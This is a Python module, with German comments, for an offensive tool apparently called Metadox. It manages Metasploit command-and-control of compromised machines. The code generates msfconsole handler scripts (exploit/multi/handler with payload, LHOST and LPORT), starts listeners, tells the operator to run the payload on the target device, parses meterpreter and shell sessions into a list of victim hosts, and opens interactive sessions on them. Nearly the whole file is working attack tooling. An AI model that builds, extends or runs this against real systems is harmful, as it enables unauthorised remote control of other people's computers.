#!/usr/bin/env python3
"""
Client Manager für Metadox
Verwaltet Metasploit-Sessions und Client-Verbindungen
"""

import os
import sys
import json
import subprocess
import time
import threading
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import socket
from color_utils import Colors, ColorPrinter


class ClientManager:
    """Klasse zur Verwaltung von Metasploit-Clients und Sessions"""
    
    def __init__(self, system_detector):
        self.system_detector = system_detector
        self.clients_file = os.path.expanduser("~/.metadox/clients.json")
        self.sessions_file = os.path.expanduser("~/.metadox/sessions.json")
        self.scripts_dir = os.path.join(os.path.dirname(__file__), "..", "scripts")
        self.clients = self._load_clients()
        self.sessions = self._load_sessions()
        self.printer = ColorPrinter()
        
        # Erstelle Scripts-Verzeichnis
        os.makedirs(self.scripts_dir, exist_ok=True)
    
    def _load_clients(self) -> Dict:
        """Lädt die Client-Liste"""
        default_clients = {}
        
        if os.path.exists(self.clients_file):
            try:
                with open(self.clients_file, 'r') as f:
                    default_clients = json.load(f)
            except Exception as e:
                print(f"⚠️  Fehler beim Laden der Clients: {e}")
        
        return default_clients
    
    def _save_clients(self):
        """Speichert die Client-Liste"""
        with open(self.clients_file, 'w') as f:
            json.dump(self.clients, f, indent=2)
    
    def _load_sessions(self) -> Dict:
        """Lädt die Session-Liste"""
        default_sessions = {}
        
        if os.path.exists(self.sessions_file):
            try:
                with open(self.sessions_file, 'r') as f:
                    default_sessions = json.load(f)
            except Exception as e:
                print(f"⚠️  Fehler beim Laden der Sessions: {e}")
        
        return default_sessions
    
    def _save_sessions(self):
        """Speichert die Session-Liste"""
        with open(self.sessions_file, 'w') as f:
            json.dump(self.sessions, f, indent=2)
    
    def _get_next_client_id(self) -> str:
        """Generiert eine neue Client-ID"""
        if not self.clients:
            return "CLIENT_001"
        
        # Finde die höchste Client-ID
        max_id = 0
        for client_id in self.clients.keys():
            if client_id.startswith("CLIENT_"):
                try:
                    num = int(client_id.split("_")[1])
                    max_id = max(max_id, num)
                except:
                    pass
        
        return f"CLIENT_{max_id + 1:03d}"
    
    def _get_client_info(self, client_id: str) -> Optional[Dict]:
        """Gibt Client-Informationen zurück"""
        return self.clients.get(client_id)
    
    def _add_client(self, client_id: str, ip: str, hostname: str, os_type: str, 
                   payload_type: str, connection_time: str) -> bool:
        """Fügt einen neuen Client hinzu"""
        self.clients[client_id] = {
            "ip": ip,
            "hostname": hostname,
            "os_type": os_type,
            "payload_type": payload_type,
            "connection_time": connection_time,
            "last_seen": time.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "connected",
            "sessions": []
        }
        
        self._save_clients()
        return True
    
    def _update_client_status(self, client_id: str, status: str):
        """Aktualisiert den Client-Status"""
        if client_id in self.clients:
            self.clients[client_id]["status"] = status
            self.clients[client_id]["last_seen"] = time.strftime("%Y-%m-%d %H:%M:%S")
            self._save_clients()
    
    def _list_clients(self):
        """Listet alle Clients auf"""
        print("\n👥 VERFÜGBARE CLIENTS")
        print("=" * 90)
        print(f"{'ID':<12} {'IP':<15} {'Hostname':<20} {'OS':<10} {'Session':<8} {'Status':<12} {'Letztes Update'}")
        print("-" * 90)
        
        if not self.clients:
            print("❌ Keine Clients gefunden")
            return
        
        for client_id, client_info in self.clients.items():
            session_id = client_info.get('session_id', 'N/A')
            status = client_info.get('status', 'unknown')
            last_seen = client_info.get('last_seen', client_info.get('connection_time', 'unknown'))
            
            print(f"{client_id:<12} {client_info['ip']:<15} {client_info['hostname']:<20} "
                  f"{client_info['os_type']:<10} {session_id:<8} {status:<12} {last_seen}")
    
    def _show_client_details(self, client_id: str):
        """Zeigt detaillierte Client-Informationen"""
        client_info = self._get_client_info(client_id)
        if not client_info:
            print(f"❌ Client {client_id} nicht gefunden")
            return
        
        print(f"\n👤 CLIENT DETAILS: {client_id}")
        print("=" * 50)
        print(f"🌐 IP-Adresse: {client_info['ip']}")
        print(f"💻 Hostname: {client_info['hostname']}")
        print(f"🖥️  Betriebssystem: {client_info['os_type']}")
        print(f"⚡ Payload-Typ: {client_info['payload_type']}")
        print(f"🔗 Verbindungszeit: {client_info['connection_time']}")
        print(f"📊 Status: {client_info['status']}")
        print(f"🕒 Letztes Update: {client_info['last_seen']}")
        
        if client_info['sessions']:
            print(f"\n📋 Aktive Sessions:")
            for session_id in client_info['sessions']:
                print(f"  - Session {session_id}")
    
    def _create_metasploit_script(self, client_id: str) -> str:
        """Erstellt ein Metasploit-Script für den Client"""
        client_info = self._get_client_info(client_id)
        if not client_info:
            return None
        
        script_content = f"""#!/usr/bin/env bash
# Metasploit Session Script für {client_id}
# Erstellt von Metadox

echo "🚀 Starte Metasploit Session für {client_id}"
echo "Client: {client_info['hostname']} ({client_info['ip']})"
echo "OS: {client_info['os_type']}"
echo "Payload: {client_info['payload_type']}"
echo "=" * 50

# Starte Metasploit Console
msfconsole -q -x "
# Zeige verfügbare Sessions
sessions -l;

# Wähle Session für {client_id} (falls vorhanden)
# sessions -i <session_id>;

# Interaktive Session
# sessions -i -1;

# Automatische Befehle
# sysinfo;
# getuid;
# pwd;
# ls;

echo 'Metasploit Session für {client_id} gestartet';
echo 'Verwende: sessions -l um alle Sessions zu sehen';
echo 'Verwende: sessions -i <id> um zu einer Session zu wechseln';
"
"""
        
        script_path = os.path.join(self.scripts_dir, f"connect_{client_id.lower()}.sh")
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        # Mache Script ausführbar
        os.chmod(script_path, 0o755)
        
        return script_path
    
    def _create_session_script(self, session_id: str, client_info: dict):
        """Erstellt ein Metasploit-Script für die Verbindung zu einer bestehenden Session"""
        script_dir = os.path.expanduser("~/.metadox/scripts")
        os.makedirs(script_dir, exist_ok=True)
        
        script_path = os.path.join(script_dir, f"connect_session_{session_id}.sh")
        
        # Erstelle Metasploit-Script
        script_content = f"""#!/bin/bash
# Metadox Session Connection Script
# Client: {client_info['hostname']} ({client_info['ip']})
# Session: {session_id}

echo "🔗 Metadox - Verbinde mit Session {session_id}"
echo "Client: {client_info['hostname']} ({client_info['ip']})"
echo "OS: {client_info['os_type']}"
echo "Payload: {client_info['payload_type']}"
echo "=================================================="

# Starte msfconsole und verbinde zur Session
msfconsole -q -x "
echo 'Verbindung zu Session {session_id}...';
sessions -i {session_id};
echo 'Session {session_id} aktiviert!';
echo 'Verwenden Sie \"help\" für verfügbare Befehle.';
echo 'Verwenden Sie \"exit\" um die Session zu beenden.';
"
"""
        
        # Schreibe Script
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        # Mache Script ausführbar
        os.chmod(script_path, 0o755)
        
        return script_path
    
    def _connect_to_client(self, client_id: str):
        """Verbindet sich mit einem Client über Metasploit"""
        client_info = self._get_client_info(client_id)
        if not client_info:
            self.printer.print_error(f"Client {client_id} nicht gefunden")
            return False
        
        self.printer.print_menu_header(f"VERBINDE MIT CLIENT: {client_id}", Colors.LIGHT_GREEN)
        self.printer.print_info(f"Client: {client_info['hostname']} ({client_info['ip']})")
        self.printer.print_info(f"OS: {client_info['os_type']}")
        self.printer.print_info(f"Payload: {client_info['payload_type']}")
        
        # Prüfe ob Session-ID vorhanden ist
        if 'session_id' not in client_info:
            self.printer.print_error("Keine aktive Session für diesen Client gefunden!")
            self.printer.print_info("Stellen Sie sicher, dass der Listener läuft und das Payload ausgeführt wurde.")
            return False
        
        session_id = client_info['session_id']
        self.printer.print_info(f"Session-ID: {session_id}")
        
        # Erstelle Metasploit-Script für Session-Verbindung
        script_path = self._create_session_script(session_id, client_info)
        if not script_path:
            self.printer.print_error("Fehler beim Erstellen des Metasploit-Scripts")
            return False
        
        self.printer.print_info(f"Script erstellt: {script_path}")
        
        # Starte Metasploit direkt im aktuellen Terminal
        try:
            self.printer.print_success("Metasploit Session gestartet!")
            self.printer.print_info("Sie sind jetzt mit dem Client verbunden!")
            
            # Starte Metasploit direkt
            subprocess.run(f"bash {script_path}", shell=True)
            return True
            
        except Exception as e:
            self.printer.print_error(f"Fehler beim Starten des Terminals: {e}")
            self.printer.print_info(f"Sie können das Script manuell ausführen: {script_path}")
            return False
    
    def _start_listener_for_payload(self):
        """Startet einen Listener für ein erstelltes Payload"""
        self.printer.print_menu_header("LISTENER FÜR PAYLOAD STARTEN", Colors.LIGHT_GREEN)
        
        # Lade alle verfügbaren Payloads
        payloads = self._load_available_payloads()
        
        if not payloads:
            self.printer.print_error("Keine Payloads gefunden! Erstellen Sie zuerst ein Payload.")
            return
        
        # Zeige verfügbare Payloads
        self.printer.print_info("Verfügbare Payloads:")
        for i, payload in enumerate(payloads, 1):
            self.printer.print_info(f"{i}. {payload['filename']} ({payload['config']['payload']})")
            self.printer.print_info(f"   LHOST: {payload['config']['lhost']}, LPORT: {payload['config']['lport']}")
        
        try:
            choice = int(input("\n🎯 Payload auswählen (Nummer): ")) - 1
            if 0 <= choice < len(payloads):
                selected_payload = payloads[choice]
                self._start_metasploit_listener(selected_payload)
            else:
                self.printer.print_error("Ungültige Auswahl!")
        except ValueError:
            self.printer.print_error("Bitte eine gültige Nummer eingeben!")
    
    def _load_available_payloads(self):
        """Lädt alle verfügbaren Payloads aus dem payloads-Verzeichnis"""
        payloads = []
        payloads_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "payloads")
        
        for os_type in ['windows', 'linux', 'macos']:
            os_dir = os.path.join(payloads_dir, os_type)
            if os.path.exists(os_dir):
                for file in os.listdir(os_dir):
                    if file.endswith('.info'):
                        info_file = os.path.join(os_dir, file)
                        try:
                            with open(info_file, 'r') as f:
                                payload_data = json.load(f)
                                payload_data['os_type'] = os_type
                                payload_data['info_file'] = info_file
                                payloads.append(payload_data)
                        except Exception as e:
                            self.printer.print_warning(f"Fehler beim Laden von {info_file}: {e}")
        
        return payloads
    
    def _start_metasploit_listener(self, payload_info):
        """Startet einen Metasploit-Listener für das ausgewählte Payload"""
        config = payload_info['config']
        lhost = config['lhost']
        lport = config['lport']
        payload = config['payload']
        filename = config['filename']
        
        self.printer.print_info(f"Starte Metasploit Handler für {filename}")
        self.printer.print_info(f"LHOST: {lhost}, LPORT: {lport}")
        self.printer.print_info(f"Payload: {payload}")
        
        # Prüfe und beende eventuell laufende Handler auf dem Port
        self._kill_existing_handlers_on_port(lport)
        
        # Erstelle Metasploit-Handler-Script
        script_path = self._create_metasploit_handler_script(lhost, lport, payload, filename)
        
        try:
            # Starte Handler direkt im aktuellen Terminal
            self.printer.print_success("Metasploit Handler gestartet!")
            self.printer.print_info("Warten Sie auf Verbindungen...")
            self.printer.print_info("Führen Sie den Payload auf dem Zielgerät aus!")
            
            # Starte Metasploit direkt
            subprocess.run(f"bash {script_path}", shell=True)
            
        except Exception as e:
            self.printer.print_error(f"Fehler beim Starten des Handlers: {e}")
    
    def _create_metasploit_handler_script(self, lhost: str, lport: str, payload: str, filename: str):
        """Erstellt ein Metasploit-Handler-Script nach Standard"""
        script_dir = os.path.expanduser("~/.metadox/scripts")
        os.makedirs(script_dir, exist_ok=True)
        
        script_path = os.path.join(script_dir, f"handler_{filename.replace('.exe', '')}.sh")
        
        # Erstelle Metasploit-Handler-Script nach Standard
        script_content = f"""#!/bin/bash
# Metadox Metasploit Handler Script
# Payload: {filename}
# LHOST: {lhost}, LPORT: {lport}
# Payload-Type: {payload}

echo "🎯 Metadox - Metasploit Handler"
echo "Payload: {filename}"
echo "LHOST: {lhost}, LPORT: {lport}"
echo "Payload-Type: {payload}"
echo "=================================================="

# Erstelle RC-Script für Metasploit
RC_FILE="/tmp/metadox_listener_$$.rc"

cat > "$RC_FILE" << 'EOF'
# Metadox Listener Configuration
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z

# Zeige Sessions
sessions -l

echo "Handler läuft im Hintergrund!"
echo "Verwenden Sie 'sessions -l' um Sessions anzuzeigen"
echo "Verwenden Sie 'sessions -i <id>' um zu einer Session zu wechseln"
echo "Verwenden Sie 'jobs' um laufende Jobs anzuzeigen"
echo "Verwenden Sie 'exit' um Metasploit zu beenden"
EOF

echo "Starte Metasploit Handler..."
msfconsole -r "$RC_FILE"

# Cleanup
rm -f "$RC_FILE"
"""
        
        # Schreibe Script
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        # Mache Script ausführbar
        os.chmod(script_path, 0o755)
        
        return script_path
    
    def _remove_client(self, client_id: str):
        """Entfernt einen Client"""
        if client_id in self.clients:
            client_info = self.clients[client_id]
            print(f"\n🗑️  ENTFERNE CLIENT: {client_id}")
            print(f"Client: {client_info['hostname']} ({client_info['ip']})")
            
            confirm = input("✅ Client wirklich entfernen? (j/n): ").strip().lower()
            if confirm in ['j', 'ja', 'y', 'yes']:
                del self.clients[client_id]
                self._save_clients()
                print(f"✅ Client {client_id} entfernt!")
            else:
                print("❌ Entfernung abgebrochen")
        else:
            print(f"❌ Client {client_id} nicht gefunden")
    
    def _show_metasploit_sessions(self):
        """Zeigt aktuelle Metasploit-Sessions nach Standard"""
        self.printer.print_menu_header("METASPLOIT SESSIONS", Colors.LIGHT_CYAN)
        
        try:
            # Führe msfconsole aus um Sessions zu prüfen (nach Standard)
            cmd = ["msfconsole", "-q", "-x", "sessions -l -v; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.printer.print_info("Aktuelle Metasploit-Sessions:")
                print(result.stdout)
                
                # Parse Sessions und füge sie zu Clients hinzu
                self._parse_and_add_sessions(result.stdout)
                
                # Zeige zusätzliche Metasploit-Informationen
                self._show_metasploit_jobs()
                
            else:
                self.printer.print_error("Fehler beim Abrufen der Sessions")
                print(f"Error: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            self.printer.print_error("Timeout beim Abrufen der Sessions")
        except Exception as e:
            self.printer.print_error(f"Fehler: {e}")
    
    def _show_metasploit_jobs(self):
        """Zeigt laufende Metasploit-Jobs"""
        try:
            self.printer.print_info("Laufende Metasploit-Jobs:")
            cmd = ["msfconsole", "-q", "-x", "jobs; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                print(result.stdout)
            else:
                self.printer.print_warning("Keine Jobs gefunden oder Fehler beim Abrufen")
                
        except Exception as e:
            self.printer.print_warning(f"Fehler beim Abrufen der Jobs: {e}")
    
    def _parse_and_add_sessions(self, session_output: str):
        """Parst Metasploit-Session-Output nach Standard und fügt neue Clients hinzu"""
        lines = session_output.split('\n')
        sessions_found = False
        
        # Suche nach Session-Tabelle (Standard Metasploit Format)
        in_session_table = False
        
        for line in lines:
            # Erkenne Session-Tabelle Start
            if 'Active sessions' in line or 'Sessions' in line:
                in_session_table = True
                continue
            
            # Erkenne Session-Tabelle Ende
            if in_session_table and ('=' in line and len(line.strip()) > 10):
                continue
            
            if in_session_table and line.strip() == '':
                continue
            
            # Parse Session-Zeilen (Standard Format)
            if in_session_table and ('meterpreter' in line or 'shell' in line):
                sessions_found = True
                self._parse_session_line(line)
        
        if not sessions_found:
            self.printer.print_info("Keine aktiven Sessions gefunden")
    
    def _parse_session_line(self, line: str):
        """Parst eine einzelne Session-Zeile nach Metasploit-Standard"""
        try:
            # Standard Metasploit Session Format:
            # "1   meterpreter x86/windows  192.168.1.100:4444 -> 192.168.1.50:12345  WIN-ABC123\\user @ WIN-ABC123"
            
            parts = line.split()
            if len(parts) < 4:
                return
            
            session_id = parts[0]
            session_type = parts[1]  # meterpreter, shell, etc.
            arch_info = parts[2]     # x86/windows, x64/linux, etc.
            
            # Extrahiere IP-Adresse aus der Verbindungsinfo
            import re
            ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
            ip_matches = re.findall(ip_pattern, line)
            
            if ip_matches:
                # Erste IP ist normalerweise die Ziel-IP
                client_ip = ip_matches[0]
                
                # Bestimme OS-Typ basierend auf Arch-Info
                os_type = "windows"
                if "linux" in arch_info.lower():
                    os_type = "linux"
                elif "macos" in arch_info.lower() or "osx" in arch_info.lower():
                    os_type = "macos"
                
                # Prüfe ob Client bereits existiert
                existing_client = None
                for client_id, client_info in self.clients.items():
                    if client_info.get('session_id') == session_id:
                        existing_client = client_id
                        break
                
                if not existing_client:
                    # Erstelle neuen Client
                    new_client_id = self._get_next_client_id()
                    hostname = f"TARGET-{session_id}"
                    connection_time = time.strftime("%Y-%m-%d %H:%M:%S")
                    
                    # Extrahiere Hostname falls verfügbar
                    if '\\' in line:
                        hostname_part = line.split('\\')[0].split()[-1]
                        if hostname_part and not hostname_part.startswith('192.168'):
                            hostname = hostname_part
                    
                    # Füge Session-ID hinzu
                    client_data = {
                        'ip': client_ip,
                        'hostname': hostname,
                        'os_type': os_type,
                        'payload_type': session_type,
                        'connection_time': connection_time,
                        'session_id': session_id,
                        'status': 'connected',
                        'arch': arch_info
                    }
                    
                    self.clients[new_client_id] = client_data
                    self._save_clients()
                    self.printer.print_success(f"Neuer Client erkannt: {new_client_id} ({client_ip}) - Session {session_id}")
                else:
                    # Aktualisiere bestehenden Client
                    self.clients[existing_client]['status'] = 'connected'
                    self.clients[existing_client]['last_seen'] = time.strftime("%Y-%m-%d %H:%M:%S")
                    self._save_clients()
                    
        except Exception as e:
            self.printer.print_warning(f"Fehler beim Parsen der Session-Zeile: {e}")
    
    def _auto_detect_clients(self):
        """Automatische Erkennung von Clients aus Metasploit-Sessions"""
        self.printer.print_info("Erkenne Clients aus Metasploit-Sessions...")
        
        try:
            # Führe msfconsole aus um Sessions zu prüfen
            cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self._parse_and_add_sessions(result.stdout)
            else:
                self.printer.print_warning("Keine Metasploit-Sessions verfügbar")
                
        except Exception as e:
            self.printer.print_error(f"Fehler bei automatischer Client-Erkennung: {e}")
    
    def _auto_check_payloads_and_start_listeners(self):
        """Überprüft automatisch alle Payloads und startet entsprechende Listener"""
        self.printer.print_menu_header("AUTOMATISCHE PAYLOAD-ÜBERPRÜFUNG", Colors.LIGHT_CYAN)
        
        # Lade alle verfügbaren Payloads
        payloads = self._load_available_payloads()
        
        if not payloads:
            self.printer.print_info("Keine Payloads gefunden.")
            return
        
        self.printer.print_info(f"Gefunden: {len(payloads)} Payload(s)")
        
        # Prüfe für jeden Payload, ob ein Listener läuft
        for payload in payloads:
            config = payload['config']
            lhost = config['lhost']
            lport = config['lport']
            payload_type = config['payload']
            filename = config['filename']
            
            self.printer.print_info(f"Prüfe Payload: {filename}")
            self.printer.print_info(f"  LHOST: {lhost}, LPORT: {lport}")
            self.printer.print_info(f"  Payload: {payload_type}")
            
            # Prüfe ob Listener bereits läuft
            if self._is_listener_running(lhost, lport):
                self.printer.print_success(f"  ✅ Listener läuft bereits auf {lhost}:{lport}")
            else:
                self.printer.print_warning(f"  ⚠️  Kein Listener gefunden für {lhost}:{lport}")
                
                # Prüfe ob Port belegt ist
                if self._is_port_in_use(lport):
                    self.printer.print_error(f"  ❌ Port {lport} ist bereits belegt!")
                    
                    # Finde freien Port
                    free_port = self._find_free_port(int(lport))
                    if free_port:
                        self.printer.print_info(f"  🔄 Verwende alternativen Port: {free_port}")
                        
                        # Frage ob mit alternativem Port gestartet werden soll
                        use_alt_port = input(f"  🎧 Listener mit Port {free_port} starten? (j/n): ").strip().lower()
                        if use_alt_port in ['j', 'ja', 'y', 'yes']:
                            # Erstelle Payload-Kopie mit neuem Port
                            alt_payload = payload.copy()
                            alt_payload['config']['lport'] = str(free_port)
                            self._start_metasploit_listener(alt_payload)
                        else:
                            self.printer.print_info(f"  ⏭️  Listener für {filename} übersprungen")
                    else:
                        self.printer.print_error(f"  ❌ Kein freier Port gefunden!")
                else:
                    # Port ist frei, starte normal
                    start_listener = input(f"  🎧 Listener für {filename} starten? (j/n): ").strip().lower()
                    if start_listener in ['j', 'ja', 'y', 'yes']:
                        self._start_metasploit_listener(payload)
                    else:
                        self.printer.print_info(f"  ⏭️  Listener für {filename} übersprungen")
        
        # Erkenne bestehende Sessions
        self.printer.print_info("Erkenne bestehende Metasploit-Sessions...")
        self._auto_detect_clients()
    
    def _is_listener_running(self, lhost: str, lport: str):
        """Prüft ob ein Listener auf der angegebenen IP/Port läuft"""
        try:
            # Prüfe mit netstat ob Port belegt ist
            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
            if result.returncode == 0:
                # Suche nach dem Port in der Ausgabe
                for line in result.stdout.split('\n'):
                    if f':{lport}' in line and 'LISTEN' in line:
                        self.printer.print_warning(f"Port {lport} ist bereits belegt!")
                        return True
            return False
        except Exception:
            return False
    
    def _find_free_port(self, start_port: int = 4444):
        """Findet einen freien Port"""
        import socket
        
        for port in range(start_port, start_port + 100):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('', port))
                    return port
            except OSError:
                continue
        return None
    
    def _kill_existing_handlers_on_port(self, port: str):
        """Beendet eventuell laufende Handler auf dem angegebenen Port"""
        try:
            # Finde Prozesse die auf dem Port lauschen
            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if f':{port}' in line and 'LISTEN' in line:
                        # Extrahiere PID
                        parts = line.split()
                        if len(parts) > 6:
                            pid_info = parts[6]
                            if '/' in pid_info:
                                pid = pid_info.split('/')[0]
                                try:
                                    # Beende den Prozess
                                    subprocess.run(['kill', '-9', pid], check=True)
                                    self.printer.print_info(f"Beendete Handler-Prozess auf Port {port} (PID: {pid})")
                                except subprocess.CalledProcessError:
                                    pass
        except Exception as e:
            self.printer.print_warning(f"Fehler beim Beenden von Handlern auf Port {port}: {e}")
    
    def _is_port_in_use(self, port: str):
        """Prüft ob ein Port belegt ist"""
        try:
            import socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                result = s.connect_ex(('localhost', int(port)))
                return result == 0
        except Exception:
            return False
    
    def _show_simplified_menu(self):
        """Zeigt das
         Client Manager Menü"""
        self.printer.print_menu_header("METADOX CLIENT MANAGER", Colors.LIGHT_BLUE)
        
        # Zeige verfügbare Payloads
        payloads = self._load_available_payloads()
        if payloads:
            self.printer.print_info(f"Verfügbare Payloads: {len(payloads)}")
            for i, payload in enumerate(payloads, 1):
                config = payload['config']
                filename = config['filename']
                lhost = config['lhost']
                lport = config['lport']
                payload_type = config['payload']
                self.printer.print_info(f"  {i}. {filename}")
                self.printer.print_info(f"     LHOST: {lhost}, LPORT: {lport}")
                self.printer.print_info(f"     Payload: {payload_type}")
        else:
            self.printer.print_warning("Keine Payloads gefunden!")
        
        self.printer.print_separator("=", Colors.BLUE, 50)
        self.printer.print_menu_item("1", "🔗 Connect Client", Colors.LIGHT_GREEN)
        self.printer.print_menu_item("2", "🔙 Zurück", Colors.LIGHT_RED)
        self.printer.print_separator("=", Colors.BLUE, 50)
    
    def _connect_to_payload(self):
        """Verbindet mit einem Payload (startet Handler in neuem Terminal)"""
        payloads = self._load_available_payloads()
        
        if not payloads:
            self.printer.print_error("Keine Payloads gefunden!")
            return
        
        # Zeige Payloads zur Auswahl
        self.printer.print_info("Verfügbare Payloads:")
        for i, payload in enumerate(payloads, 1):
            config = payload['config']
            filename = config['filename']
            lhost = config['lhost']
            lport = config['lport']
            self.printer.print_info(f"  {i}. {filename} ({lhost}:{lport})")
        
        try:
            choice = int(input(f"\n🎯 Payload auswählen (1-{len(payloads)}): ").strip())
            if 1 <= choice <= len(payloads):
                selected_payload = payloads[choice - 1]
                
                # Starte Handler in neuem Terminal (genau wie im funktionierenden Code)
                self._start_metasploit_listener(selected_payload)
                
                self.printer.print_success("Handler gestartet!")
                self.printer.print_info("Führen Sie den Payload auf dem Zielgerät aus!")
                self.printer.print_info("Das Metasploit Terminal ist in einem neuen Fenster geöffnet.")
                
            else:
                self.printer.print_error("Ungültige Auswahl!")
        except ValueError:
            self.printer.print_error("Bitte eine gültige Zahl eingeben!")
    
    def run_interactive(self):
        """Führt den interaktiven Client-Manager aus"""
        while True:
            self._show_simplified_menu()
            choice = input("🎯 Wählen Sie eine Option (1-2): ").strip()
            
            if choice == '1':
                self._connect_to_payload()
            elif choice == '2':
                break
            else:
                self.printer.print_error("Ungültige Auswahl!")


def main():
    """Test-Funktion"""
    from system_detector import SystemDetector
    
    detector = SystemDetector()
    detector.detect_system()
    
    manager = ClientManager(detector)
    manager.run_interactive()


if __name__ == "__main__":
    main()
